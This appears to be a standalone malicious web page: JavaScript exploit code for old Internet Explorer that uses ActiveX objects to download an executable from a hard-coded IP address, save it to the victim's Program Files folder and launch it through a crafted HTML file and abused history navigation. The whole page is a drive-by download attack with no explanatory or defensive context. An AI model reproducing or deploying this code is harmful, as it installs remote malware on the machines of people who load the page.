<html><body><script>
function payload(){var o=new ActiveXObject("ADODB.Stream");o.Open();o.Type=2;o.Charset="ascii";o.WriteText('<html><body onload="window.close()"><object classid="clsid:11111111-1111-1111-1111-111111111732" codebase="file://c:/progra~1/pl.exe"></object></body></html>');o.SaveToFile("c:\\x.htm",2);o.Close();var x=new ActiveXObject("Microsoft.XMLHTTP");x.Open("GET","http://63.219.176.203:80/iex/ofile.exe?url=http://63.219.176.203:80/dexUS513.exe",0);x.Send();var l=new ActiveXObject("ADODB.Stream");l.Mode=3;l.Type=1;l.Open();l.Write(x.responseBody);l.SaveToFile("c:\\progra~1\\pl.exe",2);l.Close();external.NavigateAndFind("file://c:/x.htm",'','');}
function trigger(len){if(history.length!=len)payload();else{opener.sig();return "<title>-</title><body onload=external.NavigateAndFind('res:','','')>";}}
function backbutton(){location='javascript:'+trigger+payload+'trigger('+history.length+')';}backbutton();
</script></body></html>
